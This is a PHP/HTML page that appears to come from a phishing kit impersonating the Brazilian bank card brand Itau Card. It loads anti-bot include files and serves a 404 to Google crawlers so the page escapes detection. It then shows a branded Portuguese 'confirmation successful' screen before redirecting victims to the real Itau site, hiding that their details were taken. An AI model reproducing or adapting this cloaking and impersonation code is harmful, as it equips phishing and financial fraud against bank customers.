
<?php
error_reporting(0);
ini_set(“display_errors”, 0 );
include "../BOTS/anti0.php";
include "../BOTS/anti1.php";
include "../BOTS/anti2.php";
include "../BOTS/anti3.php";
include "../BOTS/anti4.php";
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
?>

<html>
 <head> 
  <title>Itau Card | Concluído </title> 
  <meta charset="utf-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no"> 
  <meta http-equiv="refresh" content="20, url='https://www.itau.com.br/mobile/cartoes/'"> 
  <link rel="shortcut icon" href="assets/imagenss/ico_favicon.png"> 
  <link rel="stylesheet" type="text/css" href="../assets/css/benef_compras_style.css"> 
 </head> 
 <body> 
  <header class="top-promo"> 
   <img src="../assets/imagenss/img_logo.png"> 
  </header> 
  <section class="prog-cad"> 
   <ul> 
    <li class="active">Identificação</li> 
    <li class="active">Confirmação</li> 
    <li class="active">Concluído</li> 
   </ul> 
  </section> 
  <section class="eng-fim"> 
   <img class="img-suc" src="../assets/imagenss/ic_checked2.png"> 
   <h2>Parabéns</h2> 
   <p>Confirmação efetuada com sucesso!</p> 
   <p>Aguarde, você será redirecionado...</p> 
  </section> 
 </body>
</html>






